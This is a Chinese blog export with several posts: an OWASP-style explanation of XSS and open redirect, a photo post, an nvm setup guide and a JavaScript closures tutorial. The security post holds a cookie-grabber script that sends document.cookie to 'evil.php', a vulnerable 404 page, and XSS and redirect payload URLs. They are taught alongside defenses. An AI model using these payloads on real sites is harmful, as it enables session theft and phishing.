<p>如示例 1 所示，当 name 的值表现良好时，此代码可以正确运行，但如果表现不佳，则它不会阻止漏洞利用。同样，此代码看起来危险性较小，因为 name 的值是从数据库读取的，而数据库的内容显然是由应用程序管理的。但是，如果 name 的值源自用户提供的数据，则数据库可能成为恶意内容的渠道。如果不对数据库中存储的所有数据进行适当的输入验证，攻击者就可以在用户的 Web 浏览器中执行恶意命令。这种类型的利用称为存储型 XSS，特别阴险，因为数据存储造成的间接性使得识别威胁变得更加困难，并增加了攻击影响多个用户的可能性。XSS 正是以这种形式开始的，网站向访问者提供“留言簿”。攻击者会在其留言簿条目中包含 JavaScript，并且该留言簿页面的所有后续访问者都将执行恶意代码。</p>
<p>正如示例所示，XSS 漏洞是由 HTTP 响应中包含未经验证的数据的代码引起的。XSS 攻击可以通过三种方式到达受害者：</p>
<ul>
<li>如示例 1 所示，数据直接从 HTTP 请求中读取并反映在 HTTP 响应中。当攻击者导致用户向易受攻击的 Web 应用程序提供危险内容，然后该内容被反射回用户并由 Web 浏览器执行时，就会发生反射型 XSS 攻击。传送恶意内容的最常见机制是将其作为参数包含在公开发布或直接通过电子邮件发送给受害者的 URL 中。以这种方式构建的 URL 构成了许多网络钓鱼方案的核心，攻击者通过这种方式诱使受害者访问指向易受攻击站点的 URL。网站将攻击者的内容反射回用户后，该内容将被执行，并继续将私人信息（例如可能包含会话信息的 cookie）从用户的计算机传输到攻击者或执行其他恶意活动。</li>
<li>如示例 2 中所示，应用程序将危险数据存储在数据库或其他可信数据存储中。危险数据随后被读回应用程序并包含在动态内容中。当攻击者将危险内容注入数据存储中并随后读取并包含在动态内容中时，就会发生存储型 XSS 攻击。从攻击者的角度来看，注入恶意内容的最佳位置是向许多用户或特别感兴趣的用户显示的区域。感兴趣的用户通常在应用程序中拥有更高的权限，或者与对攻击者有价值的敏感数据进行交互。如果这些用户之一执行恶意内容，攻击者可能能够代表该用户执行特权操作或访问属于该用户的敏感数据。</li>
<li>应用程序外部的源将危险数据存储在数据库或其他数据存储中，并且危险数据随后作为可信数据读回到应用程序中并包含在动态内容中。</li>
</ul>
<h3 id="攻击示例"><a href="#攻击示例" class="headerlink" title="攻击示例"></a>攻击示例</h3><p><strong>示例 1：Cookie 抓取器</strong></p>
<p>如果应用程序不验证输入数据，攻击者就可以轻松窃取经过身份验证的用户的 cookie。攻击者所要做的就是将以下代码放置在任何发布的输入中（即：留言板、私人消息、用户个人资料）：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> adr = <span class="string">&#x27;../evil.php?cakemonster=&#x27;</span> + <span class="built_in">escape</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面的代码将 cookie 的转义内容（根据 RFC 内容必须在使用 GET 方法通过 HTTP 协议发送之前进行转义）传递到“cakemonster”变量中的 evil.php 脚本。然后，攻击者检查其 evil.php 脚本的结果（cookie 抓取器脚本通常会将 cookie 写入文件）并使用它。</p>
<h3 id="错误页面示例"><a href="#错误页面示例" class="headerlink" title="错误页面示例"></a>错误页面示例</h3><p>假设我们有一个错误页面，它正在处理对不存在页面的请求，这是一个典型的 404 错误页面。我们可以使用下面的代码作为示例来通知用户缺少哪些特定页面：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;Not found: &quot;</span> . <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_URI&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>让我们看看它是如何工作的：<code>http://testsite.test/file_which_not_exist</code> 我们得到的响应是：<code>Not found: /file_which_not_exist</code></p>
<p>现在我们将尝试强制错误页面包含我们的代码：<code>http://testsite.test/&lt;script&gt;alert(&quot;TEST&quot;);&lt;/script&gt;</code> 结果是：<code>Not found: / (but with JavaScript code &lt;script&gt;alert(&quot;TEST&quot;);&lt;/script&gt;)</code></p>
<p>我们已经成功注入了代码，我们的 XSS！这是什么意思？例如，我们可能会利用此缺陷来尝试窃取用户的会话 cookie。</p>
<h3 id="防御措施-5"><a href="#防御措施-5" class="headerlink" title="防御措施"></a>防御措施</h3><ul>
<li><a href="https://wiki.owasp.org/index.php/Data_Validation">数据验证</a></li>
</ul>
<h3 id="参考-8"><a href="#参考-8" class="headerlink" title="参考"></a>参考</h3><ul>
<li>OWASP 的<a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">XSS（跨站脚本）预防备忘单</a></li>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.html">对 Reflected_Cross_site_scripting 进行测试</a></li>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting.html">存储跨站点脚本测试</a></li>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting.html">基于 DOM 的跨站点脚本测试</a></li>
<li><a href="https://www.cgisecurity.com/xss-faq.html">跨站脚本常见问题解答</a></li>
<li>OWASP <a href="https://owasp.org/xss-filter-evasion-cheatsheet">XSS 过滤器规避备忘单</a></li>
<li><a href="http://www.cert.org/advisories/CA-2000-02.html">CERT 关于恶意 HTML 标签的咨询</a></li>
<li><a href="http://www.cert.org/tech_tips/malicious_code_mitigation.html">CERT“了解恶意内容缓解</a></li>
<li><a href="http://www.technicalinfo.net/papers/CSS.html">了解 CSS 漏洞的原因和影响</a></li>
<li><a href="http://www.xssed.com/">XSSed</a> - 跨站脚本 (XSS) 信息和易受攻击网站的镜像存档</li>
</ul>
<h2 id="CSP-Bypass（Content-Security-Policy-Bypass-绕过内容安全策略）"><a href="#CSP-Bypass（Content-Security-Policy-Bypass-绕过内容安全策略）" class="headerlink" title="CSP Bypass（Content Security Policy Bypass 绕过内容安全策略）"></a>CSP Bypass（Content Security Policy Bypass 绕过内容安全策略）</h2><h2 id="JavaScript-Attacks（脚本攻击）"><a href="#JavaScript-Attacks（脚本攻击）" class="headerlink" title="JavaScript Attacks（脚本攻击）"></a>JavaScript Attacks（脚本攻击）</h2><h2 id="Authorisation-Bypass（绕过授权）"><a href="#Authorisation-Bypass（绕过授权）" class="headerlink" title="Authorisation Bypass（绕过授权）"></a>Authorisation Bypass（绕过授权）</h2><h2 id="Open-HTTP-Redirect（客户端-URL-重定向）"><a href="#Open-HTTP-Redirect（客户端-URL-重定向）" class="headerlink" title="Open HTTP Redirect（客户端 URL 重定向）"></a>Open HTTP Redirect（客户端 URL 重定向）</h2><h3 id="描述-11"><a href="#描述-11" class="headerlink" title="描述"></a>描述</h3><p>这是一个输入验证缺陷，当应用程序接受用户控制的输入（指定指向可能恶意的外部 URL 的链接）时，就会存在这种缺陷。这种漏洞可用于完成网络钓鱼攻击或将受害者重定向到感染页面。</p>
<p>当应用程序接受包含 URL 值的不受信任的输入且未对其进行清理时，就会出现此漏洞。此 URL 值可能会导致 Web 应用程序将用户重定向到另一个页面，例如攻击者控制的恶意页面。</p>
<p>此漏洞可能使攻击者能够成功发起网络钓鱼诈骗并窃取用户凭据。由于重定向是由真实应用程序发起的，因此网络钓鱼尝试可能具有更值得信赖的外观。</p>
<p>以下是网络钓鱼攻击 URL 的示例。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">http://www.target.site?<span class="comment">#redirect=www.fake-target.site</span></span><br></pre></td></tr></table></figure>

<p>访问此 URL 的受害者将被自动重定向到<code>fake-target.site</code>，攻击者可以在其中放置与预期站点类似的虚假页面，以窃取受害者的凭据。</p>
<p>开放重定向还可以用来制作一个 URL，绕过应用程序的访问控制检查，并将攻击者转发到他们通常无法访问的特权功能。</p>
<h3 id="测试目标"><a href="#测试目标" class="headerlink" title="测试目标"></a>测试目标</h3><ul>
<li>识别处理 URL 或路径的注入点。</li>
<li>评估系统可以重定向到的位置。</li>
</ul>
<h3 id="如何测试-2"><a href="#如何测试-2" class="headerlink" title="如何测试"></a>如何测试</h3><p>当测试人员手动检查此类漏洞时，他们首先确定客户端代码中是否实现了客户端重定向。举一个 JavaScript 的例子，这些重定向可以使用该<code>window.location</code>对象来实现。只需为其分配一个字符串，即可将浏览器定向到另一个页面。下面的代码片段演示了这一点：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> redir = location.<span class="property">hash</span>.<span class="title function_">substring</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (redir) &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">location</span>=<span class="string">&#x27;http://&#x27;</span>+<span class="built_in">decodeURIComponent</span>(redir);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在此示例中，脚本不会对<code>redir</code>包含用户通过查询字符串提供的输入的变量执行任何验证。由于未应用任何形式的编码，因此未经验证的输入将传递给<code>windows.location</code>对象，从而创建 URL 重定向漏洞。</p>
<p>这意味着攻击者只需提交以下查询字符串即可将受害者重定向到恶意站点：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">http://www.victim.site/?<span class="comment">#www.malicious.site</span></span><br></pre></td></tr></table></figure>

<p>经过轻微修改，上面的示例代码片段可能容易受到 JavaScript 注入的攻击。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> redir = location.<span class="property">hash</span>.<span class="title function_">substring</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (redir) &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">location</span>=<span class="built_in">decodeURIComponent</span>(redir);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以通过提交以下查询字符串来利用这一点：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">http://www.victim.site/?<span class="comment">#javascript:alert(document.cookie)</span></span><br></pre></td></tr></table></figure>

<p>测试此漏洞时，请考虑不同浏览器对某些字符的处理方式不同。有关参考，请参阅<a href="https://owasp.org/www-community/attacks/DOM_Based_XSS">基于 DOM 的 XSS</a>。</p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>顾村公园的早樱</title>
    <url>/2024/03/09/20240309-%E9%A1%BE%E6%9D%91%E5%85%AC%E5%9B%AD%E7%9A%84%E6%97%A9%E6%A8%B1/</url>
    <content><![CDATA[<p>本周末上海春天的3月，郁金香先等等，春和景明就看粉色樱花！樱花树下野餐很惬意，尤其“樱花林”站附近最赞！</p>
<img data-src="https://cdn.huatree.top/image-20240311204625945.png" width="50%">

<span id="more"></span>

<div class="note warning"><p>若清除照片，请联系本人（WeChat ↓↓↓）！</p>
</div>

<h2 id="照片集"><a href="#照片集" class="headerlink" title="照片集"></a>照片集</h2><img data-src="https://cdn.huatree.top/image-20240311214129223.png" width="50%">

<img data-src="https://cdn.huatree.top/image-20240311214223368.png" width="50%">

<img data-src="https://cdn.huatree.top/image-20240311214303358.png" width="50%">
]]></content>
      <categories>
        <category>生活滋味</category>
      </categories>
      <tags>
        <tag>摄影</tag>
      </tags>
  </entry>
  <entry>
    <title>前端开发环境之macOS</title>
    <url>/2024/03/31/20240331-%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E4%B9%8BmacOS/</url>
    <content><![CDATA[<p>前端开发离不开 Node，就像西方不能失去耶路撒冷，首先搞定多版本 Node。</p>
<span id="more"></span>

<h2 id="nvm"><a href="#nvm" class="headerlink" title="nvm"></a>nvm</h2><p>github 仓库链接：<a href="https://github.com/nvm-sh/nvm">https://github.com/nvm-sh/nvm</a></p>
<p><a href="https://nodejs.org/en/">nvm 是 node.js</a>的版本管理器，设计为按用户安装并按 shell 调用。<code>nvm</code>适用于任何兼容 POSIX 的 shell（sh、dash、ksh、zsh、bash），特别是在以下平台上：unix、macOS 和<a href="https://github.com/nvm-sh/nvm#important-notes">windows WSL</a>。</p>
<h3 id="macOS-安装"><a href="#macOS-安装" class="headerlink" title="macOS 安装"></a>macOS 安装</h3><p>检查<strong>X-Code</strong>是否安装</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">xcode-select --version</span><br></pre></td></tr></table></figure>

<p>如果没看到版本信息，则需安装</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">xcode-select --install</span><br></pre></td></tr></table></figure>

<p>然后我们可以使用</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash</span><br></pre></td></tr></table></figure>

<p>从远程下载 <strong>install.sh</strong> 脚本并执行。注意这个版本年数字 <strong>v0.39.7</strong> 会随着项目开发而变化。随时通过<a href="https://github.com/creationix/nvm#install-script">官方最新安装命令</a>来检查最新安装版本是有好处的。</p>
<p>如果执行进度缓慢，切换到科学上网后执行脚本。</p>
<p>该脚本将 nvm 存储库克隆到<code>~/.nvm</code>，并尝试将下面代码片段中的源行添加到正确的配置文件（<code>~/.bash_profile</code>、<code>~/.zshrc</code>、<code>~/.profile</code>或<code>~/.bashrc</code>）。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> NVM_DIR=<span class="string">&quot;<span class="subst">$([ -z <span class="string">&quot;<span class="variable">$&#123;XDG_CONFIG_HOME-&#125;</span>&quot;</span> ] &amp;&amp; printf %s <span class="string">&quot;<span class="variable">$&#123;HOME&#125;</span>/.nvm&quot;</span> || printf %s <span class="string">&quot;<span class="variable">$&#123;XDG_CONFIG_HOME&#125;</span>/nvm&quot;</span>)</span>&quot;</span></span><br><span class="line">[ -s <span class="string">&quot;<span class="variable">$NVM_DIR</span>/nvm.sh&quot;</span> ] &amp;&amp; \. <span class="string">&quot;<span class="variable">$NVM_DIR</span>/nvm.sh&quot;</span> <span class="comment"># This loads nvm</span></span><br></pre></td></tr></table></figure>

<h4 id="补充笔记"><a href="#补充笔记" class="headerlink" title="补充笔记"></a>补充笔记</h4><ul>
<li>如果环境变量<code>$XDG_CONFIG_HOME</code>存在，它将把<code>nvm</code>文件放置在那里。</li>
<li>您可以<code>--no-use</code>在上述脚本的末尾添加 (… <code>nvm.sh --no-use</code>) 来推迟使用，<code>nvm</code>直到您手动使用<a href="https://github.com/nvm-sh/nvm#usage"><code>use</code></a>它。</li>
<li><code>NVM_SOURCE</code>您可以使用、<code>NVM_DIR</code>、<code>PROFILE</code>和变量自定义安装源、目录、配置文件和版本<code>NODE_VERSION</code>。例如：<code>curl ... | NVM_DIR=&quot;path/to/nvm&quot;</code>。确保<code>NVM_DIR</code>不包含尾部斜杠。</li>
<li>安装程序可以使用<code>git</code>、<code>curl</code>、 或<code>wget</code>进行下载<code>nvm</code>（以可用者为准）。</li>
<li>您可以通过在运行脚本之前进行设置来指示安装程序不要编辑您的 shell 配置（例如，如果您已经通过<a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/nvm">zsh nvm 插件</a>获得完成）。下面是一个用于执行此操作的单行命令示例：<code>PROFILE=/dev/null``install.sh``PROFILE=/dev/null bash -c &#39;curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash&#39;</code></li>
</ul>
<h4 id="macOS-上的故障排除"><a href="#macOS-上的故障排除" class="headerlink" title="macOS 上的故障排除"></a>macOS 上的故障排除</h4><p>从 OS X 10.9 开始，<code>/usr/bin/git</code>Xcode 命令行工具已经预设了，这意味着我们无法正确检测 Git 是否安装。在运行安装脚本之前，您需要手动安装 Xcode 命令行工具，否则会失败。 （参见<a href="https://github.com/nvm-sh/nvm/issues/1782">#1782</a>）</p>
<p>如果运行安装脚本后出现<code>nvm: command not found</code>此问题，则可能是以下原因之一：</p>
<ul>
<li>从 macOS 10.15 开始，默认 shell 是<code>zsh</code>，nvm 将寻找<code>.zshrc</code>更新，默认情况下不安装。创建一个<code>touch ~/.zshrc</code>并再次运行安装脚本。</li>
<li>如果您使用 bash（以前的默认 shell），您的系统可能没有设置该命令的文件<code>.bash_profile</code>。使用或<code>.bashrc</code>创建其中之一并再次运行安装脚本。然后，运行或来获取命令。<code>touch ~/.bash_profile``touch ~/.bashrc``. ~/.bash_profile``. ~/.bashrc``nvm</code></li>
<li>您以前使用过<code>bash</code>，但您已经<code>zsh</code>安装了。您需要手动将<a href="https://github.com/nvm-sh/nvm#manual-install">这些行</a>添加到<code>~/.zshrc</code>并运行<code>. ~/.zshrc</code>。</li>
<li>您可能需要重新启动终端实例或运行<code>. ~/.nvm/nvm.sh</code>.重新启动终端&#x2F;打开新选项卡&#x2F;窗口，或运行 source 命令将加载命令和新配置。</li>
<li>如果上述方法没有帮助，您可能需要重新启动终端实例。尝试在终端中打开一个新选项卡&#x2F;窗口并重试。</li>
</ul>
<p>如果上述方法不能解决问题，您可以尝试以下操作：</p>
<ul>
<li>如果您使用 bash，则可能是您的<code>.bash_profile</code>(或<code>~/.profile</code>) 没有<code>~/.bashrc</code>正确获取您的源。您可以通过添加<code>source ~/&lt;your_profile_file&gt;</code>或执行下面的下一步来解决此问题。</li>
<li>尝试将<a href="https://github.com/nvm-sh/nvm#profile_snippet">安装部分中的代码段</a><code>~/.bash_profile</code>添加到您常用的配置文件（ 、<code>~/.zshrc</code>、<code>~/.profile</code>或）中，该代码段会找到正确的 nvm 目录并将 nvm 加载<code>~/.bashrc</code>。</li>
<li>有关此问题和可能的解决方法的更多信息，请<a href="https://github.com/nvm-sh/nvm/issues/576">参阅此处</a></li>
</ul>
<p><strong>注意</strong><br>对于配备 Apple Silicon 芯片的 macOS，node 从 v16.0.0 开始提供<strong>arm64</strong> arch Darwin 软件包，并从 v14.17.0 开始提供从源代码编译时的实验性<strong>arm64</strong>支持。如果您在使用安装节点时遇到问题<code>nvm</code>，您可能需要更新到这些版本之一或更高版本。</p>
<h3 id="验证安装"><a href="#验证安装" class="headerlink" title="验证安装"></a>验证安装</h3><p>可以执行以下操作：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nvm -v</span><br></pre></td></tr></table></figure>

<p><code>nvm</code>如果安装成功，应该输出。</p>
<h3 id="git-安装"><a href="#git-安装" class="headerlink" title="git 安装"></a>git 安装</h3><p>如果您已<code>git</code>安装（需要 git v1.7.10+）：</p>
<ol>
<li>将此存储库克隆到您的用户配置文件的根目录中<ul>
<li><code>cd ~/</code>那么从任何地方<code>git clone https://github.com/nvm-sh/nvm.git .nvm</code></li>
</ul>
</li>
<li><code>cd ~/.nvm</code>并查看最新版本<code>git checkout v0.39.7</code></li>
<li><code>nvm</code>通过从 shell 获取它来激活：<code>. ./nvm.sh</code></li>
</ol>
<p>！！！macOS、git安装后，别忘了配置文件：</p>
<p>现在将这些行添加到您的<code>~/.bash_profile</code>、<code>~/.zshrc</code>、<code>~/.profile</code>或<code>~/.bashrc</code>文件中，以便在登录时自动获取它：（您可能需要添加到多个上述文件中）</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> NVM_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/.nvm&quot;</span></span><br><span class="line">[ -s <span class="string">&quot;<span class="variable">$NVM_DIR</span>/nvm.sh&quot;</span> ] &amp;&amp; \. <span class="string">&quot;<span class="variable">$NVM_DIR</span>/nvm.sh&quot;</span>  <span class="comment"># This loads nvm</span></span><br><span class="line">[ -s <span class="string">&quot;<span class="variable">$NVM_DIR</span>/bash_completion&quot;</span> ] &amp;&amp; \. <span class="string">&quot;<span class="variable">$NVM_DIR</span>/bash_completion&quot;</span>  <span class="comment"># This loads nvm bash_completion</span></span><br></pre></td></tr></table></figure>

<p>使其配置文件生效：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.bash_profile</span><br><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure>

<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列出可用版本ls-remote</span></span><br><span class="line">nvm ls-remote</span><br><span class="line"><span class="comment"># 要安装特定版本的节点</span></span><br><span class="line">nvm install 14.19.0</span><br><span class="line"><span class="comment"># 查看安装的版本</span></span><br><span class="line">nvm <span class="built_in">ls</span></span><br><span class="line"><span class="comment"># 设置默认版本</span></span><br><span class="line">nvm <span class="built_in">alias</span> default 14.19.0</span><br></pre></td></tr></table></figure>

<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>类似 nvm 的 Node 版本管理工具，还有 <a href="https://github.com/Schniz/fnm">fnm</a>、<a href="https://volta.jikun.dev/guide/introduction.html">volta</a>。</p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://github.com/nvm-sh/nvm/issues/2350">nvm install node fails to install on macOS Big Sur M1 Chip</a></p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>理解闭包与内存泄漏</title>
    <url>/2023/05/25/20230525-%E7%90%86%E8%A7%A3%E9%97%AD%E5%8C%85%E4%B8%8E%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F/</url>
    <content><![CDATA[<p>闭包，是指<strong>有权访问另一个函数作用域中变量的函数</strong>。</p>
<span id="more"></span>

<div class="note info"><p>文章转载自<a href="https://segmentfault.com/a/1190000039132414">前海拾贝</a></p>
</div>

<h2 id="闭包的定义"><a href="#闭包的定义" class="headerlink" title="闭包的定义"></a>闭包的定义</h2><p>从定义上我们可以知道，<strong>闭包是函数</strong>，并且是<strong>被另一个函数包裹的函数</strong>。所以需要<strong>用一个函数去包裹另一个函数</strong>，即<strong>在函数内部定义函数</strong>。<strong>被包裹的函数</strong>则称为<strong>闭包函数</strong>，<strong>包裹的函数(外部的函数)则为闭包函数提供了一个闭包作用域</strong>，所以<strong>形成的闭包作用域的名称为外部函数的名称</strong>。</p>
<p>我们先来看一个常见的闭包例子，如:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> foo;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">outer</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// outer函数内部为闭包函数提供一个闭包作用域(outer)</span></span><br><span class="line">    <span class="keyword">let</span> bar = <span class="string">&quot;bar&quot;</span>;</span><br><span class="line">    <span class="keyword">let</span> inner = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(bar);</span><br><span class="line">        <span class="keyword">debugger</span>; <span class="comment">// 打一个debuuger断点，以便查看闭包作用域</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;inner function run.&quot;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> inner;</span><br><span class="line">&#125;</span><br><span class="line">foo = <span class="title function_">outer</span>(); <span class="comment">// 执行外部函数返回内部函数</span></span><br><span class="line"><span class="title function_">foo</span>(); <span class="comment">// 执行内部函数</span></span><br></pre></td></tr></table></figure>

<p>我们在浏览器上执行该段代码后，会停在断点位置，此时我们可以看到形成的闭包作用域如图所示：</p>
<p><img data-src="https://image-static.segmentfault.com/485/175/485175884-601524fcd3995" alt="img01"></p>
<p>从图中我们可以看到，<strong>形成的闭包作用域名称为外部的 outer 函数提供的作用域</strong>，闭包作用域内有一个变量 bar 可以被闭包函数访问到。</p>
<h2 id="形成闭包的条件"><a href="#形成闭包的条件" class="headerlink" title="形成闭包的条件"></a>形成闭包的条件</h2><p>从上面的闭包例子在，看起来形成的闭包的条件就是，一个函数被另一个函数包裹，并且返回这个被包裹的函数供外部持有。其实，<strong>闭包函数是否被外部变量持有并不重要</strong>，形成闭包的必要条件就是，<strong>闭包函数(被包裹的函数)中必须要使用到外部函数中的变量</strong>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">outer</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// outer函数内部为闭包函数提供一个闭包作用域(outer)</span></span><br><span class="line">    <span class="keyword">let</span> bar = <span class="string">&quot;bar&quot;</span>;</span><br><span class="line">    <span class="keyword">let</span> inner = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(bar);</span><br><span class="line">        <span class="keyword">debugger</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;inner function run.&quot;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="title function_">inner</span>(); <span class="comment">// 直接在外部函数中执行闭包函数inner</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">outer</span>();</span><br></pre></td></tr></table></figure>

<p>我们稍微修改一下上面的例子，<strong>外部函数 outer 不将内部函数 inner 返回，而是直接在 outer 内执行</strong>。</p>
<p><img data-src="https://image-static.segmentfault.com/588/769/588769328-601527b237cfa" alt="img02"></p>
<p>从执行结果可以看到，仍然形成了闭包，所以说<strong>这个被包裹的闭包函数是否被外部持有并不是形成闭包的条件</strong>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">outer</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// outer函数内部为闭包函数提供一个闭包作用域(outer)</span></span><br><span class="line">    <span class="keyword">let</span> bar = <span class="string">&quot;bar&quot;</span>;</span><br><span class="line">    <span class="keyword">let</span> inner = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">// console.log(bar); // 注释该行，内部inner函数不再使用外部outer函数中的变量</span></span><br><span class="line">        <span class="keyword">debugger</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;inner function run.&quot;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="title function_">inner</span>(); <span class="comment">// 直接在外部函数中执行闭包函数inner</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">outer</span>();</span><br></pre></td></tr></table></figure>

<p>我们再修改一下上面的例子，将<code>console.log(bar)</code>这行代码注释掉，这样<strong>inner 函数中将不再使用外部 outer 函数中的变量</strong>。</p>
<p><img data-src="https://image-static.segmentfault.com/149/143/1491432555-6015288b58394" alt="img03"></p>
<p>从执行结果上可以看到，<strong>没有形成闭包</strong>。所以形成闭包的必要条件就是，<strong>被包裹的闭包函数必须使用外部函数中的变量</strong>。</p>
<p>当然上面的结论也太过绝对了些，因为<strong>外部函数可以同时包裹多个闭包函数</strong>，也就是说，**(外部)函数内部定义了多个函数<strong>，这种情况下，就不需要每个闭包函数都使用到外部函数中的变量，因为</strong>闭包作用域是内部所有闭包函数共享的<strong>，</strong>只要有一个内部函数使用到了外部函数中的变量即可形成闭包**。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">outer</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// outer函数内部为闭包函数提供一个闭包作用域(outer)</span></span><br><span class="line">    <span class="keyword">let</span> bar = <span class="string">&quot;bar&quot;</span>;</span><br><span class="line">    <span class="keyword">let</span> unused = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(bar); <span class="comment">// 再创建一个闭包函数，并在其中使用外部函数中的变量</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">let</span> inner = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">// console.log(bar); // 注释该行，内部inner函数不再使用外部outer函数中的变量</span></span><br><span class="line">        <span class="keyword">debugger</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;inner function run.&quot;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="title function_">inner</span>(); <span class="comment">// 直接在外部函数中执行闭包函数inner</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">outer</span>();</span><br></pre></td></tr></table></figure>

<p>我们继续修改一下上面的例子，在 outer 函数内部再创建一个 unused 函数，<strong>这个函数只是定义但不会执行</strong>，同时<strong>unused 函数内部使用了外部 outer 函数中的变量</strong>，inner 函数仍然不使用外部 outer 函数中的变量。</p>
<p><img data-src="https://image-static.segmentfault.com/341/767/3417675909-60152a90a21c6" alt="img04"></p>
<p>从执行结果可以看到，<strong>又形成了闭包</strong>。所以形成的闭包条件就是，<strong>存在内部函数中使用外部函数中定义的变量</strong>。</p>
